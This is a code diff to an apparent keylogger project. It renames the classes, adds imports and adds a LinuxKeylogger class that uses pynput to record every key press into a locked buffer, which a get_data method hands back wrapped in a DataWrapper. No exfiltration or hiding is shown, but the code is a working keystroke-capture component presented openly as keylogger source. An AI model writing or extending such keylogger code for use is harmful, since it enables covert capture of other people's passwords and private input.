@@ -1,8 +1,12 @@
+import threading
+import keyboard
+from pynput import keyboard as kb
 from typing import List, Protocol
-import keyboard   
+
+from keylogger.data_wrapper import DataWrapper
 
 
-class Listner(Protocol):
+class Listener(Protocol):
     buffer: List[str]  # buffer to store the data
 
     """
@@ -35,7 +39,8 @@ class Listner(Protocol):
         """
         ...
 
-class Keylogger:
+
+class WindowsKeylogger:
     def __init__(self):
         self.buffer: List[str] = []
 
@@ -65,3 +70,39 @@ class Keylogger:
         """
         self.buffer.append(event.name)
 
+
+class LinuxKeylogger:
+    def __init__(self):
+        self.buffer: List[str] = []
+        self.listener = kb.Listener(on_press=self._on_key_event)
+        self._lock = threading.Lock()
+
+    def start(self) -> None:
+        """
+        start listening to keyboard events.
+        """
+        self.listener.start()
+
+    def stop(self) -> None:
+        """
+        stop listening to keyboard events.
+        """
+        if self.listener.is_alive():
+            self.listener.stop()
+
+    def get_data(self) -> List[str]:
+        """
+        get the data that has been collected and reset the buffer.
+        """
+        with self._lock:
+            data = self.buffer.copy()
+            self.buffer.clear()
+
+        return DataWrapper(data)
+
+    def _on_key_event(self, key: kb.Key | kb.KeyCode):
+        """
+        internal method to handle key events.
+        """
+        with self._lock:
+            self.buffer.append(key.char if hasattr(key, "char") else key.name)
